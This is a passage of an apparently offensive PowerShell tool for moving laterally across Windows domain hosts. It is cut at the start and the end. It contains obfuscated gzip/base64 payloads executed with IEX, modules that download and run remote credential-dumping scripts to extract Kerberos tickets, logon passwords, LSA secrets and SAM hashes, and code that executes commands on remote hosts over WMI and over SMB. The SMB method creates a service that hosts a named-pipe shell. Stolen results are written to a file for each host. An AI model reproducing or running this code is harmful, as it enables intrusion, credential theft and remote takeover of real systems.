g/FGwEikMF6QPjdo6gDZbW3wiW/Q1B3AfqAsylP8Gl11zGE1xGzWU+wWXWXNYTXFbNZT/BZddcjSe4GjWX8wSXs+baTDtrBnhFkzlhKC1zVFZ5yvWnYTmGGuEoyXDVMede103n2a1oEGYJp1Oc8gu/2+qRkoB8Wl+Sj3SQ4dB8mFQRitYFQgEOwx9XqCjxRytagK6/d8n8H53W8YcyTsDydaPkQWGDQvyiiMfh4pSjA0r4Sz25VdfK8Xf7OH04poQ/
i5VQlvu4CNwSkfbXLVCvSPthGJkDy7QHNsRpC6H7zzU3LmbUi+wkgzcZUZL29/d5Tzgjg5Dqhv3H+v8A9eh9jGkfAAA=";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
'@

$Mongoose = @'
Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
'@


################################################################################################################
######################################## Command and Module logic ## ###########################################
################################################################################################################

# Tickets
if ($Module -eq "Tickets"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Tickets - KerbDump
if ($Module -eq "KerbDump"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LogonPasswords
elseif ($Module -eq "LogonPasswords"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# eKeys
elseif ($Module -eq "ekeys"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LSA
elseif ($Module -eq "LSA"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# SAM
elseif ($Module -eq "SAM"){
$b64 = "$LocalSAM"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Disks
elseif ($Module -eq "disks"){
$b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# LoggedOnUsers
elseif ($Module -eq "LoggedOnUsers"){
$b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# Sessions
elseif ($Module -eq "Sessions"){
$b64 = "Write-host; query user | Out-String"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# ConsoleHistory
elseif ($Module -eq "ConsoleHistory"){
$b64 = "$ConsoleHostHistory"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Files
elseif ($Module -eq "Files"){
$b64 = "$Files"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

elseif ($Module -eq "" -and $Command -ne ""){
$base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
$Command = "powershell.exe -ep bypass -enc $base64Command"
}


################################################################################################################
################################# Logic to help keep output tidy and even ######################################
################################################################################################################

if ($Method -ne "Spray"){
$NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
$OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
}

################################################################################################################
################################################ Function: WMI #################################################
################################################################################################################
Function Method-WMIexec {
param ($ComputerName)
Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList


$scriptBlock = {
    param ($computerName, $Command, $Username, $Password, $LocalAuth)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect"}


    
    Function LocalWMI {

param (
    [string]$Command = "",
    [string]$Username = "",
    [string]$Password = "",
    [string]$ComputerName = "",
    [switch]$LocalAuth = $true,
    [string]$Class = "PMEClass"
)

$LocalUsername = "$ComputerName\$UserName"
$LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($LocalUsername,$LocalPassword)
$osInfo = $null

if ($Command -eq ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue" -Credential $cred
    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
}


#Check access
$ErrorActionPreference = "silentlycontinue"
$osInfo = $null  # Reset $osInfo variable before each iteration

# OSinfo
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred

# If OSinfo true and command empty
if ($osinfo -and $Command -eq ""){
$result =  "Reminder to move this outside of runspace"
return $result

}

# If OSinfo true and command not empty
elseif ($osinfo -and $Command -ne ""){

if ($LocalAuth){	
	function CreateScriptInstance([string]$ComputerName, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred
    
    if (!$classCheck) {Write-Host "ClassCheck"
$Code = "CgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACIAXABcACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQBcAHIAbwBvAHQAXABjAGkAbQB2ADIAIgAsAFsAcw
B0AHIAaQBuAGcAXQA6ADoARQBtAHAAdAB5ACwAJABuAHUAbABsACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAFsAIgBfAF8AQwBMAEEAUwBTACIAXQAgAD0AIAAiAFAATQBFAEMAbABhAHMAcwAiAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFEAdQBhAGwAaQBmAGkAZQByAHMALgBBAGQAZAAoACIAUwB0AGEAdABpAGMAIgAs
ACQAdAByAHUAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBBAGQAZAAoACIAQwBvAG0AbQBhAG4AZABJAGQAIgAsAFsAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBpAG0AVAB5AHAAZQBdADoAOgBTAHQAcgBpAG4AZwAsACQAZgBhAGwAcwBlACkACgAgACAAIAAgAC
QAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAQwBvAG0AbQBhAG4AZABJAGQAIgBdAC4AUQB1AGEAbABpAGYAaQBlAHIAcwAuAEEAZABkACgAIgBLAGUAeQAiACwAJAB0AHIAdQBlACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwAuAEEAZABkACgAIgBDAG8AbQBtAGEA
bgBkAE8AdQB0AHAAdQB0ACIALABbAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEMAaQBtAFQAeQBwAGUAXQA6ADoAUwB0AHIAaQBuAGcALAAkAGYAYQBsAHMAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAdQB0ACgAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgA="


$CommandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $Code"
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred



# Required, if we proceed to quickly the class will not register and cause a break. Should probably loop this so we can move on as soon as the class is created
Start-Sleep -Seconds "10"
    
    }
    elseif ($classCheck -ne $null){
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred

    
    $wmiInstance.GetType() | Out-Null
    $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
    $wmiInstance.Dispose()
    return $CommandId
    }
}

$Commandid = CreateScriptInstance $ComputerName $cred $Class $LocalAuth


function GetScriptOutput([string]$ComputerName, [string]$CommandId, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    try {
            $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $cred 
        
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {
        Write-Host "Failed"
        #Write-Error $_.Exception.Message
    } 
    finally {
        if ($wmiInstance) {
            $wmiInstance.Dispose()
        }
    }
}

function ExecCommand([string]$ComputerName, [string]$Command, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
    
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred
 
    if ($process.ReturnValue -eq 0) {
        $started = Get-Date
        Do {
            if ($started.AddMinutes(2) -lt (Get-Date)) {
                Write-Host "PID: $($process.ProcessId) - Response took too long."
                break
            }
    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred
            
            Start-Sleep -Seconds 1
        } While ($watcher -ne $null)
        $scriptOutput = GetScriptOutput $ComputerName $ScriptCommandID $cred $Class $LocalAuth
        return $scriptOutput
    }
}

$commandString = $Command
$scriptCommandId = CreateScriptInstance $ComputerName $cred $Class $LocalAuth
if ($scriptCommandId -eq $null) {
    Write-Host "Script Command ID Failed" -ForegroundColor "Red"
}
$encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
$result = ExecCommand $ComputerName $encodedCommand $Cred $Class $LocalAuth
$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred
return $result
}



}

elseif (!$osinfo){
    if ($SuccessOnly){return} 
        elseif (!$SuccessOnly) {

               return "Access Denied"
            }
        }
}
    if ($LocalAuth) {return LocalWMI -Username $Username -Password $Password -ComputerName $computerName -Command $Command}
    
    Function WMI {

param (
  [string]$Command = "",
  [string]$ComputerName,
  [string]$Class = "PMEClass"
)

if ($Command -eq ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
}

if ($Command -ne ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
    if (!$osInfo){return "Access Denied"}
}

function CreateScriptInstance([string]$ComputerName) {
        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
        if ($classCheck -eq $null) {
            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
            $newClass["__CLASS"] = "$Class"
            $newClass.Qualifiers.Add("Static",$true)
            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
            $newClass.Put() | Out-Null
        }
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
        $wmiInstance.GetType() | Out-Null
        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
        $wmiInstance.Dispose()
        return $CommandId
        
    }

function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
    try {
        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {Write-Error $_.Exception.Message} 
    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
}


    function ExecCommand([string]$ComputerName, [string]$Command) {
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
            return $scriptOutput
        }
    }

    $commandString = $Command
    $scriptCommandId = CreateScriptInstance $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand $ComputerName $encodedCommand
    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    return $result

    

}
    if (!$LocalAuth) {return WMI -ComputerName $computerName -Command $Command}

}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "WMI " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

# Create and invoke runspaces for each computer
# Filter non-candidate systems before wasting processing power on creating runspaces
foreach ($computer in $computers) {
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]


        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth)
        $runspace.RunspacePool = $runspacePool

        [void]$runspaces.Add([PSCustomObject]@{
            Runspace = $runspace
            Handle = $runspace.BeginInvoke()
            ComputerName = $ComputerName
            OS = $OS
            Completed = $false
        })
    }




# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Yellow -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################## Function: SMB ################################################
################################################################################################################
Function Method-SMB{
Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param($ComputerName, $Command)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }   
    
$SMBCheck = $false
$SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction "SilentlyContinue"

if (!$SMBCheck) {
    return "Access Denied"
}

if ([string]::IsNullOrWhiteSpace($Command)) {
    return "Successful connection PME"
}




    
    function Enter-SMBSession {

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "45000"
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1028, 1028, `$null)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
	}
}
`$pipeServer.Disconnect()
`$pipeServer.Dispose()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
	$startarguments = "\\$ComputerName start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	Start-Sleep -Milliseconds 2000
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	
 	try {
		$pipeClient.Connect($Timeout)
	} catch [System.TimeoutException] {
		return "Timed Out"

	} catch {
		Write-Output "unexpected error"
		Write-Output ""
		return
	}

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	try{
		if ($Command) {
			$fullCommand = "$Command 2>&1 | Out-String"
			$sw.WriteLine($fullCommand)
			$sw.Flush()
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					return
				} else {
					$serverOutput += "$line`n"
				}
			}
		} 
		
	}
	
	finally{
		$stoparguments = "\\$ComputerName delete $ServiceName"
		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
		if ($sw) { $sw.Close() }
		if ($sr) { $sr.Close() }
	}
	
}
    return Enter-SMBSession -ComputerName $ComputerName -Command $Command




}


function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "SMB " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

# Create and invoke runspaces for each computer
foreach ($computer in $computers) {

    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]

    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
    $runspace.RunspacePool = $runspacePool

    [void]$runspaces.Add([PSCustomObject]@{
        Runspace = $runspace
        Handle = $runspace.BeginInvoke()
        ComputerName = $ComputerName
        OS = $OS
        Completed = $false
        })
}

# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false

            # [other conditions for $result]
